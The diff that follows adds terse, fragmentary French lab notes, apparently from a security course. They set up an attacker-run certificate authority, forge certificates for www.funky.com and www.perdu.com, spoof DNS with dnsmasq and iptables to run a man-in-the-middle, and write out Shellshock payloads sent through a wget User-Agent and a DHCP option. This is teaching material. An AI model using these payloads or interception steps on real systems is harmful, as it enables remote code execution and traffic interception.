@@ -1,0 +1,71 @@
+OSCAR
+./CA.sh -newca -> demoCA/cacert.pem
+
+Country
+Locality
+.
+.
+.
+Common Name Oscar CA
+
+/CA.sh -newreq -> newreq
+Country/	  newkey
+Common Name: www.funky.com
+./CA.sh -sign
+cat newreq newcert > dacert.pem
+
+ALICE
+déplacer
+cacert.pem /usr/lib/ssl/certs
+
+./c_hash cacert.pem
+
+3fdff......0 => cacert.pem
+ hash
+ 
+ ln -s cacert.pem hash
+ 
+openssl s_client -connect www.funky.com:443 -msg -showcerts -CApath /usr/lib/ssl/certs
+
+
+
+Exercice 3
+
+8.8.8.8 perdu
+www.perdu.com
+
+oscar
+CA
+0.6.6.6
+création d'un certificat pour www.perdu.com
+./CA.sh -newreq ...
+./CA.sh -sign
+
+
+BOXA
+dhcp, dns -> dnsmask.conf
+
+/etc/dnsmask.conf
+ -> address=/www.perdu.com/10.6.6.6
+ 
+ /etc/init.d/dnsmask restart
+ 
+iptables -t nat ... -j DNAT ...
+
+ALICE
+openssl s_client
+
+OSCAR
+openssl s_server
+
+
+
+
+Exercice 4
+wget -U "() {;}; cmd" http://ip/cgi-bin/test.sh
+
+dnsmask.conf
+
+dhcp-option[-force]=114, "(){;}; cmd" >> dnsmask.conf
+
+
